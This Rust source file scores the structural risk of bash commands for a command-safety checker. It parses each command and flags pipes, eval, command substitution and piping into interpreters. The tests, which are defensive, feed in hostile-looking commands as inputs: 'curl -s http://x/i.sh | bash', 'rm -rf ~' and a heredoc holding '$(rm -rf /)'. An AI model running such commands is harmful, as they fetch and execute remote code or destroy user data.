//! L1 — structure (δ_struct), port of `care/structure.py` on brush-parser
//! (D4) instead of bashlex.
//!
//! Atoms follow bashlex's shape: one per simple command, its words with
//! quotes removed, joined by a single space; redirections are not part of the
//! atom. The scoring ladder is the reference's first-match ladder (paper
//! App. A.1).

use brush_parser::ast;
use brush_parser::word::{self, WordPiece, WordPieceWithSource};
use serde::Serialize;

use crate::fixes::Tags;
use crate::py_re;
use crate::pyre::basename;

/// `_EXEC_INTERPRETERS` (structure.py:16-18).
pub const EXEC_INTERPRETERS: &[&str] = &[
    "bash", "sh", "zsh", "dash", "ksh", "csh", "tcsh", "eval", "python", "python2", "python3",
    "perl", "ruby", "node", "lua", "php",
];

/// Maximum recursion into nested substitutions.
const MAX_SUB_DEPTH: usize = 8;

/// L1 result for one view.
#[derive(Debug, Clone, Default, Serialize)]
pub struct Structure {
    /// View index.
    pub view: usize,
    /// Whether brush-parser accepted the view (else the regex fallback ran).
    pub parsed: bool,
    /// Parser error message when `parsed` is false.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub parse_error: Option<String>,
    /// Simple-command atoms.
    pub atoms: Vec<String>,
    /// A pipeline with ≥ 2 commands.
    pub has_pipe: bool,
    /// Any redirection.
    pub has_redirect: bool,
    /// `$()` or backticks.
    pub has_command_sub: bool,
    /// `eval` / `source` / `.` as a command head.
    pub has_eval: bool,
    /// Pipeline ends in an interpreter.
    pub has_pipe_to_exec: bool,
    /// Maximum command-substitution nesting depth.
    pub nested_sub_depth: usize,
    /// δ_struct.
    pub structure_risk: f64,
}

impl Structure {
    fn score(&mut self) {
        self.structure_risk = if self.has_pipe_to_exec {
            1.0
        } else if self.has_eval {
            0.9
        } else if self.nested_sub_depth >= 2 {
            0.6
        } else if self.has_command_sub {
            0.30
        } else if self.has_pipe {
            0.05
        } else {
            0.0
        };
    }
}

/// Parse a string with brush-parser's default (bash) options.
pub fn parse(src: &str) -> Result<ast::Program, String> {
    let mut p = brush_parser::Parser::new(
        std::io::BufReader::new(src.as_bytes()),
        &brush_parser::ParserOptions::default(),
    );
    p.parse_program().map_err(|e| e.to_string())
}

/// Analyse one view.
pub fn analyze(view: usize, src: &str, tags: &mut Tags) -> Structure {
    let mut s = Structure {
        view,
        ..Structure::default()
    };
    match parse(src) {
        Ok(prog) => {
            s.parsed = true;
            let mut w = Walker {
                src,
                s: &mut s,
                tags,
            };
            w.program(&prog, 0, false);
            s.score();
        }
        Err(e) => {
            s.parse_error = Some(e);
            fallback(src, &mut s, tags);
        }
    }
    s
}

py_re!(re_fb_eval, r"\b(eval|source)\b");
py_re!(
    re_fb_pipe_exec,
    r"\|\s*(bash|sh|zsh|dash|eval|python[23]?|perl|ruby|node)\b"
);
py_re!(
    re_fb_pipe_exec_path,
    r"\|\s*[^\s|;&]*/(bash|sh|zsh|dash|eval|python[23]?|perl|ruby|node)\b"
);

/// `_fallback` (structure.py:121-131) with FIX-005 (true nesting depth
/// instead of a count) and FIX-013 (`| /bin/sh`).
fn fallback(cmd: &str, s: &mut Structure, tags: &mut Tags) {
    s.atoms = vec![cmd.to_string()];
    s.has_pipe = cmd.contains('|');
    s.has_redirect = cmd.contains('>');
    s.has_command_sub = cmd.contains("$(") || cmd.contains('`');
    s.has_eval = re_fb_eval().is_match(cmd);
    s.has_pipe_to_exec = re_fb_pipe_exec().is_match(cmd);
    if !s.has_pipe_to_exec && re_fb_pipe_exec_path().is_match(cmd) {
        s.has_pipe_to_exec = true;
        tags.fix("FIX-013");
    }
    let count = cmd.matches("$(").count() + cmd.matches('`').count() / 2;
    let depth = substitution_depth(cmd);
    if (count >= 2) != (depth >= 2) {
        tags.fix("FIX-005");
    }
    s.nested_sub_depth = depth;
    s.score();
}

/// Lexical nesting depth of `$( … )` / backtick substitutions.
pub fn substitution_depth(cmd: &str) -> usize {
    #[derive(PartialEq)]
    enum F {
        Sub,
        Paren,
        Tick,
    }
    let mut stack: Vec<F> = Vec::new();
    let mut max = 0;
    let chars: Vec<char> = cmd.chars().collect();
    let mut i = 0;
    while i < chars.len() {
        let c = chars[i];
        if c == '$' && chars.get(i + 1) == Some(&'(') {
            stack.push(F::Sub);
            i += 2;
        } else if c == '(' {
            stack.push(F::Paren);
            i += 1;
        } else if c == ')' {
            stack.pop();
            i += 1;
        } else if c == '`' {
            if let Some(pos) = stack.iter().rposition(|f| *f == F::Tick) {
                stack.truncate(pos);
            } else {
                stack.push(F::Tick);
            }
            i += 1;
        } else {
            i += 1;
        }
        let d = stack.iter().filter(|f| **f != F::Paren).count();
        max = max.max(d);
    }
    max
}

struct Walker<'a, 't> {
    src: &'a str,
    s: &'a mut Structure,
    tags: &'t mut Tags,
}

impl Walker<'_, '_> {
    fn program(&mut self, p: &ast::Program, depth: usize, ctrl: bool) {
        for list in &p.complete_commands {
            self.compound_list(list, depth, ctrl);
        }
    }

    fn compound_list(&mut self, l: &ast::CompoundList, depth: usize, ctrl: bool) {
        for item in &l.0 {
            self.and_or(&item.0, depth, ctrl);
        }
    }

    fn and_or(&mut self, a: &ast::AndOrList, depth: usize, ctrl: bool) {
        self.pipeline(&a.first, depth, ctrl);
        for next in &a.additional {
            match next {
                ast::AndOr::And(p) | ast::AndOr::Or(p) => self.pipeline(p, depth, ctrl),
            }
        }
    }

    fn pipeline(&mut self, p: &ast::Pipeline, depth: usize, ctrl: bool) {
        if p.seq.len() >= 2 {
            self.s.has_pipe = true;
            if let Some(ast::Command::Simple(last)) = p.seq.last()
                && let Some(head) = self.simple_words(last).first()
            {
                if EXEC_INTERPRETERS.contains(&head.as_str()) {
                    self.s.has_pipe_to_exec = true;
                } else if EXEC_INTERPRETERS.contains(&basename(head)) {
                    self.s.has_pipe_to_exec = true;
                    self.tags.fix("FIX-013");
                }
            }
        }
        for c in &p.seq {
            self.command(c, depth, ctrl);
        }
    }

    fn command(&mut self, c: &ast::Command, depth: usize, ctrl: bool) {
        match c {
            ast::Command::Simple(sc) => self.simple(sc, depth, ctrl),
            ast::Command::Compound(cc, redirs) => {
                self.compound(cc, depth, ctrl);
                if let Some(r) = redirs {
                    for io in &r.0 {
                        self.redirect(io, depth);
                    }
                }
            }
            ast::Command::Function(f) => {
                self.compound(&f.body.0, depth, true);
                if let Some(r) = &f.body.1 {
                    for io in &r.0 {
                        self.redirect(io, depth);
                    }
                }
            }
            ast::Command::ExtendedTest(t, redirs) => {
                self.test_expr(&t.expr, depth);
                if let Some(r) = redirs {
                    for io in &r.0 {
                        self.redirect(io, depth);
                    }
                }
            }
        }
    }

    fn test_expr(&mut self, e: &ast::ExtendedTestExpr, depth: usize) {
        match e {
            ast::ExtendedTestExpr::And(a, b) | ast::ExtendedTestExpr::Or(a, b) => {
                self.test_expr(a, depth);
                self.test_expr(b, depth);
            }
            ast::ExtendedTestExpr::Not(a) | ast::ExtendedTestExpr::Parenthesized(a) => {
                self.test_expr(a, depth)
            }
            ast::ExtendedTestExpr::UnaryTest(_, w) => {
                self.render_word(&w.value, depth);
            }
            ast::ExtendedTestExpr::BinaryTest(_, a, b) => {
                self.render_word(&a.value, depth);
                self.render_word(&b.value, depth);
            }
        }
    }

    fn compound(&mut self, cc: &ast::CompoundCommand, depth: usize, ctrl: bool) {
        match cc {
            ast::CompoundCommand::BraceGroup(b) => self.compound_list(&b.list, depth, ctrl),
            ast::CompoundCommand::Subshell(s) => self.compound_list(&s.list, depth, ctrl),
            ast::CompoundCommand::Arithmetic(_) => {}
            ast::CompoundCommand::ArithmeticForClause(f) => {
                self.compound_list(&f.body.list, depth, true)
            }
            ast::CompoundCommand::ForClause(f) => {
                if let Some(vals) = &f.values {
                    for w in vals {
                        self.render_word(&w.value, depth);
                    }
                }
                self.compound_list(&f.body.list, depth, true);
            }
            ast::CompoundCommand::CaseClause(c) => {
                self.render_word(&c.value.value, depth);
                for item in &c.cases {
                    if let Some(l) = &item.cmd {
                        self.compound_list(l, depth, true);
                    }
                }
            }
            ast::CompoundCommand::IfClause(i) => {
                self.compound_list(&i.condition, depth, true);
                self.compound_list(&i.then, depth, true);
                if let Some(elses) = &i.elses {
                    for e in elses {
                        if let Some(c) = &e.condition {
                            self.compound_list(c, depth, true);
                        }
                        self.compound_list(&e.body, depth, true);
                    }
                }
            }
            ast::CompoundCommand::WhileClause(w) | ast::CompoundCommand::UntilClause(w) => {
                self.compound_list(&w.0, depth, true);
                self.compound_list(&w.1.list, depth, true);
            }
            ast::CompoundCommand::Coprocess(c) => self.command(&c.body, depth, true),
        }
    }

    /// Rendered (quote-removed) words of a simple command, without walking
    /// substitutions (used for the pipeline-tail head).
    fn simple_words(&mut self, sc: &ast::SimpleCommand) -> Vec<String> {
        let mut words = Vec::new();
        let mut scratch = Structure::default();
        let mut tags = Tags::default();
        let mut w = Walker {
            src: self.src,
            s: &mut scratch,
            tags: &mut tags,
        };
        for item in simple_items(sc) {
            if let Some(t) = w.item_word(item, MAX_SUB_DEPTH, false) {
                words.push(t);
            }
        }
        words
    }

    fn simple(&mut self, sc: &ast::SimpleCommand, depth: usize, ctrl: bool) {
        // Atoms of nested substitutions are pushed while rendering; the outer
        // atom goes before them (reference order: outer command first).
        let slot = self.s.atoms.len();
        let mut words = Vec::new();
        for item in simple_items(sc) {
            if let Some(t) = self.item_word(item, depth, true) {
                words.push(t);
            }
        }
        if words.is_empty() {
            return;
        }
        if matches!(words[0].as_str(), "eval" | "source" | ".") {
            self.s.has_eval = true;
        }
        if ctrl {
            self.tags.fix("FIX-011");
        }
        self.s.atoms.insert(slot, words.join(" "));
    }

    fn item_word(&mut self, item: Item<'_>, depth: usize, walk: bool) -> Option<String> {
        match item {
            Item::Word(w) => Some(if walk {
                self.render_word(&w.value, depth)
            } else {
                render_only(&w.value)
            }),
            Item::Redirect(io) => {
                if walk {
                    self.redirect(io, depth);
                }
                None
            }
            Item::ProcSub(kind, sub) => {
                let lead = match kind {
                    ast::ProcessSubstitutionKind::Read => '<',
                    ast::ProcessSubstitutionKind::Write => '>',
                };
                let body = char_slice(self.src, sub.loc.start.index, sub.loc.end.index);
                let text = if body.starts_with('(') {
                    format!("{lead}{body}")
                } else {
                    format!("{lead}({body})")
                };
                if walk {
                    self.tags.fix("FIX-005");
                    self.compound_list(&sub.list, depth, false);
                }
                Some(text)
            }
        }
    }

    fn redirect(&mut self, io: &ast::IoRedirect, depth: usize) {
        self.s.has_redirect = true;
        match io {
            ast::IoRedirect::File(_, _, target) => match target {
                ast::IoFileRedirectTarget::Filename(w)
                | ast::IoFileRedirectTarget::Duplicate(w) => {
                    self.render_word(&w.value, depth);
                }
                ast::IoFileRedirectTarget::ProcessSubstitution(_, sub) => {
                    self.tags.fix("FIX-005");
                    self.compound_list(&sub.list, depth, false);
                }
                ast::IoFileRedirectTarget::Fd(_) => {}
            },
            ast::IoRedirect::HereDocument(_, h) => {
                if h.requires_expansion
                    && let Ok(pieces) =
                        word::parse_heredoc(&h.doc.value, &brush_parser::ParserOptions::default())
                {
                    let mut out = String::new();
                    self.pieces(&h.doc.value, &pieces, depth, &mut out);
                }
            }
            ast::IoRedirect::HereString(_, w) | ast::IoRedirect::OutputAndError(w, _) => {
                self.render_word(&w.value, depth);
            }
        }
    }

    /// Quote-remove a word (bashlex `word.word` shape) and walk any command
    /// substitutions inside it (FIX-005).
    fn render_word(&mut self, raw: &str, depth: usize) -> String {
        match word::parse(raw, &brush_parser::ParserOptions::default()) {
            Ok(pieces) => {
                let mut out = String::new();
                self.pieces(raw, &pieces, depth, &mut out);
                out
            }
            Err(_) => brush_parser::unquote_str(raw),
        }
    }

    fn pieces(
        &mut self,
        raw: &str,
        pieces: &[WordPieceWithSource],
        depth: usize,
        out: &mut String,
    ) {
        for p in pieces {
            let src = raw.get(p.start_index..p.end_index).unwrap_or("");
            match &p.piece {
                WordPiece::Text(t)
                | WordPiece::SingleQuotedText(t)
                | WordPiece::AnsiCQuotedText(t) => out.push_str(t),
                WordPiece::DoubleQuotedSequence(inner)
                | WordPiece::GettextDoubleQuotedSequence(inner) => {
                    self.pieces(raw, inner, depth, out)
                }
                WordPiece::EscapeSequence(e) => out.push_str(e.strip_prefix('\\').unwrap_or(e)),
                WordPiece::CommandSubstitution(inner)
                | WordPiece::BackquotedCommandSubstitution(inner) => {
                    out.push_str(src);
                    self.substitution(inner, depth);
                }
                WordPiece::TildeExpansion(_)
                | WordPiece::ParameterExpansion(_)
                | WordPiece::ArithmeticExpression(_) => out.push_str(src),
            }
        }
    }

    fn substitution(&mut self, inner: &str, depth: usize) {
        self.tags.fix("FIX-005");
        self.s.has_command_sub = true;
        self.s.nested_sub_depth = self.s.nested_sub_depth.max(depth + 1);
        if depth + 1 >= MAX_SUB_DEPTH {
            return;
        }
        if let Ok(prog) = parse(inner) {
            let mut w = Walker {
                src: inner,
                s: &mut *self.s,
                tags: &mut *self.tags,
            };
            w.program(&prog, depth + 1, false);
        }
    }
}

enum Item<'a> {
    Word(&'a ast::Word),
    Redirect(&'a ast::IoRedirect),
    ProcSub(&'a ast::ProcessSubstitutionKind, &'a ast::SubshellCommand),
}

fn simple_items(sc: &ast::SimpleCommand) -> Vec<Item<'_>> {
    let mut items = Vec::new();
    fn conv(x: &ast::CommandPrefixOrSuffixItem) -> Item<'_> {
        match x {
            ast::CommandPrefixOrSuffixItem::IoRedirect(io) => Item::Redirect(io),
            ast::CommandPrefixOrSuffixItem::Word(w) => Item::Word(w),
            ast::CommandPrefixOrSuffixItem::AssignmentWord(_, w) => Item::Word(w),
            ast::CommandPrefixOrSuffixItem::ProcessSubstitution(k, s) => Item::ProcSub(k, s),
        }
    }
    if let Some(p) = &sc.prefix {
        items.extend(p.0.iter().map(conv));
    }
    if let Some(w) = &sc.word_or_name {
        items.push(Item::Word(w));
    }
    if let Some(s) = &sc.suffix {
        items.extend(s.0.iter().map(conv));
    }
    items
}

fn render_only(raw: &str) -> String {
    let mut scratch = Structure::default();
    let mut tags = Tags::default();
    let mut w = Walker {
        src: raw,
        s: &mut scratch,
        tags: &mut tags,
    };
    w.render_word(raw, MAX_SUB_DEPTH)
}

/// Slice by char indices (brush AST locations count chars).
fn char_slice(s: &str, start: usize, end: usize) -> &str {
    let mut it = s
        .char_indices()
        .map(|(b, _)| b)
        .chain(std::iter::once(s.len()));
    let a = it.clone().nth(start).unwrap_or(s.len());
    let b = it.nth(end).unwrap_or(s.len());
    s.get(a..b.max(a)).unwrap_or("")
}

#[cfg(test)]
mod tests {
    use super::*;

    fn run(c: &str) -> (Structure, Tags) {
        let mut t = Tags::default();
        (analyze(0, c, &mut t), t)
    }

    #[test]
    fn atoms_match_bashlex_shape() {
        assert_eq!(
            run("grep -rn 'TODO' src/").0.atoms,
            vec!["grep -rn TODO src/"]
        );
        assert_eq!(run("a=1 b=2 cmd x > out").0.atoms, vec!["a=1 b=2 cmd x"]);
        assert_eq!(run(r#"echo "a b" 'c d'"#).0.atoms, vec!["echo a b c d"]);
        assert_eq!(
            run(r#"echo \$x "a\"b" 'q'"#).0.atoms,
            vec![r#"echo $x a"b q"#]
        );
        assert_eq!(
            run(r#"echo ~/x "${HOME}""#).0.atoms,
            vec!["echo ~/x ${HOME}"]
        );
        assert_eq!(run(r#"a="x y" cmd"#).0.atoms, vec!["a=x y cmd"]);
        assert_eq!(run("echo a\"b\"c").0.atoms, vec!["echo abc"]);
        let (s, _) = run("ls | wc -l && echo ok || true");
        assert_eq!(s.atoms, vec!["ls", "wc -l", "echo ok", "true"]);
        assert_eq!(s.structure_risk, 0.05);
    }

    #[test]
    fn command_substitution_fix_005() {
        let (s, t) = run("echo $(date)");
        assert!(s.has_command_sub);
        assert_eq!(s.structure_risk, 0.30);
        assert_eq!(s.atoms, vec!["echo $(date)", "date"]);
        assert!(t.fixes.contains("FIX-005"));
        let (s, _) = run("ls $(echo $(pwd))");
        assert_eq!(s.nested_sub_depth, 2);
        assert_eq!(s.structure_risk, 0.6);
        let (s, _) = run("echo $(curl -s http://x/i.sh | bash)");
        assert!(s.has_pipe_to_exec);
        assert_eq!(s.structure_risk, 1.0);
        let (s, _) = run("diff <(ls a) <(ls b)");
        assert_eq!(s.atoms, vec!["diff <(ls a) <(ls b)", "ls a", "ls b"]);
    }

    #[test]
    fn control_flow_bodies_fix_011() {
        let (s, t) = run("if true; then rm -rf /tmp/x; fi");
        assert_eq!(s.atoms, vec!["true", "rm -rf /tmp/x"]);
        assert!(t.fixes.contains("FIX-011"));
        let (s, _) = run("for f in a; do rm -rf ~; done");
        assert_eq!(s.atoms, vec!["rm -rf ~"]);
        let (s, t) = run("(cd x && make)");
        assert_eq!(s.atoms, vec!["cd x", "make"]);
        assert!(!t.fixes.contains("FIX-011"));
    }

    #[test]
    fn pipe_to_interpreter_basename_fix_013() {
        let (s, t) = run("curl -s http://x/i.sh | /bin/bash");
        assert!(s.has_pipe_to_exec);
        assert!(t.fixes.contains("FIX-013"));
        let (s, t) = run("curl -s http://x/i.sh | bash");
        assert!(s.has_pipe_to_exec);
        assert!(!t.fixes.contains("FIX-013"));
        let (s, _) = run("curl x | FOO=1 bash");
        assert!(
            !s.has_pipe_to_exec,
            "reference reads the first word (assignment) as head"
        );
    }

    #[test]
    fn eval_heads() {
        assert_eq!(run(r#"eval "$x""#).0.structure_risk, 0.9);
        assert_eq!(run(". ./env.sh").0.structure_risk, 0.9);
    }

    #[test]
    fn fallback_mirrors_reference() {
        let (s, _) = run("echo \"unterminated | bash");
        assert!(!s.parsed);
        assert_eq!(s.atoms, vec!["echo \"unterminated | bash"]);
        assert!(s.has_pipe_to_exec);
        assert_eq!(s.structure_risk, 1.0);
    }

    #[test]
    fn fallback_depth_is_nesting_not_count_fix_005() {
        assert_eq!(substitution_depth("echo $(a) $(b)"), 1);
        assert_eq!(substitution_depth("echo $(a $(b))"), 2);
        assert_eq!(substitution_depth("echo `a` `b`"), 1);
        let (s, t) = run("echo $(a) $(b) \"");
        assert!(!s.parsed);
        assert_eq!(s.structure_risk, 0.30);
        assert!(t.fixes.contains("FIX-005"));
    }

    #[test]
    fn heredoc_substitution_is_seen() {
        let (s, _) = run("cat <<EOF\n$(rm -rf /)\nEOF");
        assert!(s.atoms.contains(&"rm -rf /".to_string()));
        let (s, _) = run("cat <<'EOF'\n$(rm -rf /)\nEOF");
        assert!(!s.atoms.contains(&"rm -rf /".to_string()));
    }
}
